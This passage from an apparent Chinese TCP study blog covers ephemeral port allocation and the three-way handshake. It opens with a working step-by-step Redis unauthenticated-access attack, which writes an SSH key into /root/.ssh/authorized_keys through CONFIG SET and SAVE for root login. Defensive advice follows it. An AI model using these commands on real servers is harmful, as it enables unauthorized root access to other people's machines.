<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/49.jpg"></p>
<p>可以看到 redis 服务器默认监听 0.0.0.0:6379，表示允许任意来源的连接 6379 端口，可以在另外一台机器使用 telnet 或者 nc 访问此端口，如果成功连接，可以输入 ping 看是否返回 pong。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc c4 6379</span><br><span class="line">ping</span><br><span class="line">+PONG</span><br></pre></td></tr></table></figure>
<p>注意 Centos7 上默认启用了防火墙，会禁止访问某些端口，可以下面的方式禁用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop firewalld.service</span><br></pre></td></tr></table></figure>
<p>4、客户端使用 ssh-keygen 生成公钥，不停按 enter，不出意外马上在~/.ssh生成了目录生成了公私钥文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"></span><br><span class="line">ll ~&#x2F;.ssh</span><br><span class="line">ya@c2 ~$ ll .ssh</span><br><span class="line">-rw-------. 1 ya ya 1.7K 4月  14 03:00 id_rsa</span><br><span class="line">-rw-r--r--. 1 ya ya  387 4月  14 03:00 id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>5、将客户端公钥写入到文件 foo.txt 中以便后面写入到 redis，其实是生成一个头尾都包含两个空行的公钥文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br></pre></td></tr></table></figure>
<p>6、先清空 Redis 存储所有的内容，将 foo.txt 文件内容写入到某个 key 中，这里为 crackit，随后调用 redis-cli 登录 redis 调用 config 命令设置文件 redis 的 dir 目录和把 rdb 文件的名字dbfilename 设置为 authorized_keys。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.211.55.12 echo flushall</span><br><span class="line">cat foo.txt | redis-cli -h 10.211.55.12 -x set crackit</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 登录 Redis</span><br><span class="line">redis-cli -h 10.211.55.12</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line"></span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br></pre></td></tr></table></figure>
<p>7、执行 save 将 crackit 内容 落盘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure>
<p>8、尝试登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.211.55.12</span><br></pre></td></tr></table></figure>
<p>我们来看一下，服务器 <code>10.211.55.12</code> 机器上 <code>/root/.ssh/authorized_keys</code> 的内容，可以看到 <code>authorized_keys</code> 文件正是我们客户端机器的公钥文件</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/50.jpg"></p>
<p>利用这个漏洞有几个前提条件</p>
<p>1.Redis 绑定<code>0.0.0.0</code> 允许所有来源的<code> TCP</code> 连接，且没有设置密码 这完全是作死，因为就算不能入侵你的系统，也可以修改 Redis 中缓存的内容。不过 Redis 的设计者们一开始就认为不会有人这么做，因为把 Redis 放在一个信任的内网环境运行才是正道啊。</p>
<p>2.Redis 没有设置密码或密码过于简单 大部分开发都没有意识到 <code>Redis</code> 没有密码是一个大问题，要么是一个很简单的密码要么没有密码，Redis 的处理能力非常强，auth这种命令可以一秒钟处理几万次以上，简单的密码很容易被暴力破解</p>
<p>3.<code>redis-server</code> 进程使用 root 用户启动 不用 root 用户启动也可以完成刷新 authorized_keys 的功能，但是不能登陆，因为非 root 用户 <code>authorized_keys</code> 的权限要求是 <code>600</code> 才可以登录，但是可以覆盖破坏系统的文件。</p>
<p>4.没有禁用 <code>save</code>、<code>config</code>、<code>flushall</code> 这些高危操作 在正式服务器上这些高危操作都应该禁用或者进行重命名。这样就算登录你你的 Redis，也没有办法修改 Redis 的配置和修改服务器上的文件。</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>●首要原则：不暴露服务到公网 让 <code>redis</code> 运行在相对可信任的内网环境<br>●设置高强度密码 使用高强度密码增加暴力破解的难度<br>●禁止 <code>root</code> 用户启动 <code>redis</code> 业务服务永远不要使用 root 权限启动<br>●禁用或者重命名高危命令 禁用或者重命名 save、config、flushall 等这些高危命令，就算成功登陆了 Redis，也就只能折腾你的 redis，不能取得系统的权限进行更危险的操作<br>●升级高版本的 Redis 出现如此严重的问题，Redis 从 3.2 版本加入了 protected mode， 在没有指定 bind 地址或者没有开启密码设置的情况下，只能通过回环地址本地访问，如果尝试远程访问 redis，会提示以下错误：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command &#39;CONFIG SET protected-mode no&#39; from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to &#39;no&#39;, and then restarting the server. 3) If you started the server manually just for testing, restart it with the &#39;--protected-mode no&#39; option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.</span><br></pre></td></tr></table></figure>

<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>这篇文章讲解了端口号背后的细节，我为你准备了思维导图：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/51.jpg"></p>
<h3 id="作业题-2"><a href="#作业题-2" class="headerlink" title="作业题"></a>作业题</h3><p>1、小于（B）的 TCP/UDP 端口号已保留与现有服务一一对应，此数字以上的端口号可自由分配？</p>
<pre><code>A、80
B、1024
C、8080
D、65525</code></pre>
<p>2、下列TCP端口号中不属于熟知端口号的是（D）</p>
<pre><code>A、21
B、23
C、80
D、3210</code></pre>
<p>3、关于网络端口号，以下哪个说法是正确的（A）</p>
<pre><code>A、通过 netstat 命令，可以查看进程监听端口的情况
B、https 协议默认端口号是 8081
C、ssh 默认端口号是 80
D、一般认为，0-80 之间的端口号为周知端口号(Well Known Ports)</code></pre>
<h2 id="8-临时端口号是如何分配的"><a href="#8-临时端口号是如何分配的" class="headerlink" title="8 临时端口号是如何分配的"></a>8 临时端口号是如何分配的</h2><p>我们知道客户端主动发起请求 connect 时，操作系统会为它分配一个临时端口（ephemeral port）。在 linux 上 这个端口的取值范围由 <code>/proc/sys/net/ipv4/ip_local_port_range</code> 文件的值决定，在我的 CentOS 机器上，临时端口的范围是 32768~60999。</p>
<p>有两种典型的使用方式会生成临时端口：</p>
<p>1.调用 <code>bind</code> 函数不指定端口<br>2.调用 <code>connect</code> 函数</p>
<p>先来看 bind 调用的例子，故意注释掉端口的赋值，完整的代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int main(void) &#123;</span><br><span class="line">  int listenfd;</span><br><span class="line">  socklen_t clilen;</span><br><span class="line">  struct sockaddr_in cliaddr, servaddr;</span><br><span class="line">  listenfd &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">  bzero(&amp;servaddr, sizeof(servaddr));</span><br><span class="line">  servaddr.sin_family &#x3D; AF_INET;</span><br><span class="line">  servaddr.sin_addr.s_addr &#x3D; htonl (INADDR_ANY);</span><br><span class="line">  &#x2F;&#x2F; 这里故意注释掉端口的赋值</span><br><span class="line">  &#x2F;&#x2F;  servaddr.sin_port &#x3D; htons (9090);</span><br><span class="line">  bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr));</span><br><span class="line">  listen(listenfd, 5);</span><br><span class="line">  clilen &#x3D; sizeof(cliaddr);</span><br><span class="line">  accept(listenfd, (struct sockaddr *)&amp;cliaddr, &amp;clilen);</span><br><span class="line">  sleep(-1);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译执行上面的代码，使用 netstat 可以看到 linux 自动为其分配了一个临时的端口 40843。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 0.0.0.0:40843           0.0.0.0:*               LISTEN      21608&#x2F;.&#x2F;a.out</span><br></pre></td></tr></table></figure>
<p>再来看第二个例子客户端 connect，使用 nc 或者 telnet 访问本地或远程的服务时，都会自动分配一个临时端口号。比如执行 <code>nc localhost 8080</code> 访问本机的 web 服务器，随后使用 <code>netstat </code>查看连接状态，可以看到分配了临时端口号 37778。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 127.0.0.1:37778         127.0.0.1:8080          ESTABLISHED 22126&#x2F;nc</span><br></pre></td></tr></table></figure>
<h3 id="临时端口号分配的源码分析"><a href="#临时端口号分配的源码分析" class="headerlink" title="临时端口号分配的源码分析"></a>临时端口号分配的源码分析</h3><p>接下来的内容以 connect 为例，linux 内核版本是 3.10.0。核心的代码在 net/ipv4/inet_hashtables.c 中，为了方便我做了部分精简。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">int __inet_hash_connect(struct sock *sk, u32 port_offset) &#123;</span><br><span class="line">  int low;  &#x2F;&#x2F; 临时端口号的下界</span><br><span class="line">  int high; &#x2F;&#x2F; 临时端口号的上界</span><br><span class="line">  static u32 hint; &#x2F;&#x2F; 使用静态变量保存的递增值，减少 offset 冲突的可能性</span><br><span class="line">  &#x2F;&#x2F; port_offset 是根据源地址、目的地址、目标端口计算出的哈希值</span><br><span class="line">  u32 offset &#x3D; hint + port_offset;</span><br><span class="line">  int port;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 读取 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range 的临时端号的上界和下界</span><br><span class="line">  inet_get_local_port_range(net, &amp;low, &amp;high);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; remaining 是临时端口号可分配值的范围</span><br><span class="line">  int remaining &#x3D; (high - low) + 1;</span><br><span class="line"></span><br><span class="line">  &#x2F;* By starting with offset being an even number,</span><br><span class="line">   * we tend to leave about 50% of ports for other uses,</span><br><span class="line">   * like bind(0).</span><br><span class="line">   *&#x2F;</span><br><span class="line">  offset &amp;&#x3D; ~1; &#x2F;&#x2F; 将最后一位置为 0</span><br><span class="line"></span><br><span class="line">  int i;</span><br><span class="line">  &#x2F;&#x2F; 从 0 开始遍历，查找未被占用的端口号</span><br><span class="line">  for (i &#x3D; 0; i &lt; remaining; i++) &#123;</span><br><span class="line">    &#x2F;&#x2F; 保证 port 的范围是在 low~high 之间</span><br><span class="line">    port &#x3D; low + (i + offset) % remaining;</span><br><span class="line">    &#x2F;&#x2F; 检查端口号是否属于保留端口号</span><br><span class="line">    if (inet_is_reserved_local_port(port))</span><br><span class="line">      continue;</span><br><span class="line">    &#x2F;&#x2F; 接下来检查端口是否被占用、等逻辑</span><br><span class="line">    if (all_ok) &#123;</span><br><span class="line">      goto ok;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  ok:</span><br><span class="line">      &#x2F;&#x2F; 下次 connect 时 hint 递增，减少端口号冲突的概率</span><br><span class="line">      hint +&#x3D; (i + 2) &amp; ~1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中传入的 port_offset 的计算逻辑是在 net/core/secure_seq.c 的 secure_ipv4_port_ephemeral 方法中实现的，代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">u32 secure_ipv4_port_ephemeral(__be32 saddr, __be32 daddr, __be16 dport)</span><br><span class="line">&#123;</span><br><span class="line">	u32 hash[MD5_DIGEST_WORDS];</span><br><span class="line"></span><br><span class="line">	net_secret_init();</span><br><span class="line">	hash[0] &#x3D; (__force u32)saddr; &#x2F;&#x2F; 源地址</span><br><span class="line">	hash[1] &#x3D; (__force u32)daddr; &#x2F;&#x2F; 目标地址</span><br><span class="line">	hash[2] &#x3D; (__force u32)dport ^ net_secret[14]; &#x2F;&#x2F; 目标端口号</span><br><span class="line">	hash[3] &#x3D; net_secret[15];</span><br><span class="line"></span><br><span class="line">	md5_transform(hash, net_secret); &#x2F;&#x2F; 计算 MD5值</span><br><span class="line"></span><br><span class="line">	return hash[0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为此时还没有源端口，这个函数使用<code>源地址</code>、<code>目标地址</code>、<code>目标端口号</code>这三个元素进行 <code>MD5 运算</code>得到一个 offset 值，通过同一组源地址、目标地址、目标端口号计算出的 offset 值相等，这也是为什么需要加入地址 <code>hint</code> 的原因，否则使对同一个目标端口服务同时进行请求时，第一次 for 循环计算出来的端口都是一样的。加入了递增的 hint 以后，就可以避免这种情况了。</p>
<h3 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h3><p>以一次实际的计算为例，经过调试 linux 内核，在某一次 <code>telnet localhost 2000</code> 过程中，分配到的临时端口号是 48968，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 127.0.0.1:48968         127.0.0.1:2000          ESTABLISHED 16475&#x2F;telnet</span><br></pre></td></tr></table></figure>
<p>下面看下计算的过程。</p>
<p>●根据 ip_local_port_range 的值，low=32768，high=48948，remaining=28232<br>●在我的虚拟机中，除了测试的代码没有跑其它的应用，分配端口号不会冲突，面代码中的 for 循环只会循环一次，i 值等于 0。<br>●在此次测试中 hint=32，port_offset=266836801</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; offset &#x3D; 32 + 266836801 &#x3D; 0xfe79b61</span><br><span class="line">u32 offset &#x3D; hint + port_offset;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; offset &#x3D; 0xfe79b60</span><br><span class="line">offset &amp;&#x3D; ~1; &#x2F;&#x2F; 将最后一位置为 0</span><br><span class="line">&#x2F;&#x2F; port &#x3D; 32768 + (0 + 0xfe79b60) % 28232</span><br><span class="line">&#x2F;&#x2F; port &#x3D; 32768 + 16200 &#x3D; 48968</span><br><span class="line">port &#x3D; low + (i + offset) % remaining;</span><br></pre></td></tr></table></figure>
<h3 id="临时端口号分配完了会发生什么"><a href="#临时端口号分配完了会发生什么" class="headerlink" title="临时端口号分配完了会发生什么"></a>临时端口号分配完了会发生什么</h3><p>如果短时间内大量 connect，耗尽了所有临时端口号会发生什么？我们来实测一下。</p>
<p>使用 sysctl 修改 ip_local_port_range 的范围，只允许分配一个端口 50001，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip_local_port_range&#x3D;&quot;50001 50001&quot;</span><br></pre></td></tr></table></figure>
<p>使用 nc 或者 telnet 等工具发起 TCP 连接，这里使用<code>nc -4 localhost 22</code>，使用 netstat 查看当前连接信息，可以看到分配的临时端口为 50001，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 127.0.0.1:50001         127.0.0.1:22            ESTABLISHED 18605&#x2F;nc</span><br></pre></td></tr></table></figure>
<p>再次执行 nc 发起连接，可以看到这次失败了，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -4 localhost 22</span><br><span class="line">                                                                                                                                             </span><br><span class="line">Ncat: Cannot assign requested address.</span><br></pre></td></tr></table></figure>
<p>使用 strace 查看 nc 命令系统调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace nc -4 localhost 22</span><br></pre></td></tr></table></figure>
<p>系统调用如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) &#x3D; 3</span><br><span class="line">fcntl(3, F_GETFL)                       &#x3D; 0x2 (flags O_RDWR)</span><br><span class="line">fcntl(3, F_SETFL, O_RDWR|O_NONBLOCK)    &#x3D; 0</span><br><span class="line">connect(3, &#123;sa_family&#x3D;AF_INET, sin_port&#x3D;htons(22), sin_addr&#x3D;inet_addr(&quot;127.0.0.1&quot;)&#125;, 16) &#x3D; -1 EADDRNOTAVAIL (Cannot assign requested address)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到 connect 调用返回了 EADDRNOTAVAIL 错误。使用 golang 的代码和结果如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	&#x2F;&#x2F; 仅使用 ipv4</span><br><span class="line">	_, err :&#x3D; net.Dial(&quot;tcp4&quot;, &quot;localhost:22&quot;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	time.Sleep(time.Minute * 10)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译运行上面的 go 代码结果如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dial tcp4 127.0.0.1:22: connect: cannot assign requested address</span><br></pre></td></tr></table></figure>
<h2 id="9-TCP-恋爱史第一步-——-从三次握手说起"><a href="#9-TCP-恋爱史第一步-——-从三次握手说起" class="headerlink" title="9 TCP 恋爱史第一步 —— 从三次握手说起"></a>9 TCP 恋爱史第一步 —— 从三次握手说起</h2><h3 id="三次握手-1"><a href="#三次握手-1" class="headerlink" title="三次握手"></a>三次握手</h3><p>一次经典的三次握手的过程如下图所示：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/52.jpg"></p>
<p>三次握手的最重要的是交换彼此的 <code>ISN</code>（初始序列号），序列号怎么计算来的可以暂时不用深究，我们需要重点掌握的是包交互过程中序列号变化的原理。</p>
<p>1、客户端发送的一个段是 SYN 报文，这个报文只有 SYN 标记被置位。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/53.jpg"></p>
<p>SYN 报文不携带数据，但是它占用一个序号，下次发送数据序列号要加一。客户端会随机选择一个数字作为初始序列号（ISN）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么 SYN 段不携带数据却要消耗一个序列号呢？</span><br></pre></td></tr></table></figure>
<p>这是一个好问题，<code>不占用序列号的段</code>是<code>不需要确认的</code>（都没有内容确认个啥），比如 ACK 段。SYN 段需要对方的确认，需要占用一个序列号。后面讲到四次挥手那里 FIN 包也有同样的情况，在那里我们会用一个图来详细说明。</p>
<p>关于这一点，可以记住如下的规则：</p>
<p>凡是消耗序列号的 TCP 报文段，一定需要对端确认。如果这个段没有收到确认，会<code>一直重传</code>直到达到<code>指定的次数</code>为止。</p>
<p>2、服务端收到客户端的 SYN 段以后，将 SYN 和 ACK 标记都置位</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/54.jpg"></p>
<p>SYN 标记的作用与步骤 1 中的一样，也是同步服务端生成的初始序列号。ACK 用来告知发送端之前发送的 SYN 段已经收到了，「确认号」字段指定了发送端下次发送段的序号，这里等于客户端 ISN 加一。 与前面类似 SYN + ACK 端虽然没有携带数据，但是因为 SYN 段需要被确认，所以它也要<code>消耗一个序列号</code>。</p>
<p>3、客户端发送三次握手最后一个 ACK 段，这个 ACK 段用来确认收到了服务端发送的 SYN 段。因为这个 ACK 段不携带任何数据，且不需要再被确认，这个 ACK 段<code>不消耗任何序列号</code>。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/55.jpg"></p>
<p>在 wireshark 中 SEQ 和 ACK 号都是绝对序号，一般而言这些序号都较大，为了便于分析，我们一般都会显示相对序列号，在 wireshark 的”Edit-&gt;Preferences-&gt;Protocols-&gt;TCP”菜单里可以进行设置显示相对序列号，</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/56.jpg"></p>
<p>除了交换彼此的初始序列号，三次握手的另一个重要作用是交换一些辅助信息，比如<code>最大段大小</code>（<code>MSS</code>）、<code>窗口大小</code>（<code>Win</code>）、<code>窗口缩放因子</code>（<code>WS</code>)、是否支持<code>选择确认</code>（<code>SACK_PERM</code>）等，这些都会在后面的文章中重点介绍。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/57.jpg"></p>
<h3 id="初始序列号（Initial-Sequence-Number-ISN）-1"><a href="#初始序列号（Initial-Sequence-Number-ISN）-1" class="headerlink" title="初始序列号（Initial Sequence Number, ISN）"></a>初始序列号（Initial Sequence Number, ISN）</h3><p>初始的序列号并非从 0 开始，通信双方各自生成，一般情况下两端生成的序列号不会相同。生成的算法是 ISN 随时间而变化，会递增的分配给后续的 TCP 连接的 ISN。</p>
<p>一个建议的算法是设计一个假的时钟，每 <code>4 微妙</code>对 ISN 加一，溢出 <code>2^32</code> 以后回到 0，这个算法使得猜测 ISN 变得非常困难。</p>
<pre><code> ISN 能设置成一个固定值呢？</code></pre>
<p>答案是不能，TCP 连接四元组（<code>源 IP</code>、<code>源端口号</code>、<code>目标 IP</code>、<code>目标端口号</code>）唯一确定，所以就算所有的连接 <code>ISN</code> 都是一个固定的值，连接之间也是不会互相干扰的。但是会有几个严重的问题</p>
<p>1、出于安全性考虑。如果被知道了连接的ISN，很容易构造一个在对方窗口内的序列号，<code>源 IP</code> 和<code>源端口号</code>都很容易伪造，这样一来就可以<code>伪造 RST 包</code>，将连接强制关闭掉了。如果采用动态增长的 ISN，要想构造一个在对方窗口内的序列号难度就大很多了。</p>
<p>2、因为开启 <code>SO_REUSEADDR</code> 以后端口允许重用，收到一个包以后不知道新连接的还是旧连接的包因为网络的原因姗姗来迟，造成数据的混淆。如果采用动态增长的 <code>ISN</code>，那么可以保证两个连接的 ISN 不会相同，不会串包。</p>
<h3 id="三次握手的状态变化"><a href="#三次握手的状态变化" class="headerlink" title="三次握手的状态变化"></a>三次握手的状态变化</h3><p>三次握手过程的状态变化图如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/58.jpg"></p>
<p>对于客户端而言：</p>
<p>1.初始的状态是处于 <code>CLOSED</code> 状态。CLOSED 并不是一个真实的状态，而是一个假想的起点和终点。</p>
<p>2.客户端调用 <code>connect</code> 以后会发送 SYN 同步报文给服务端，然后进入 <code>SYN-SENT</code> 阶段，客户端将保持这个阶段直到它收到了服务端的确认包。</p>
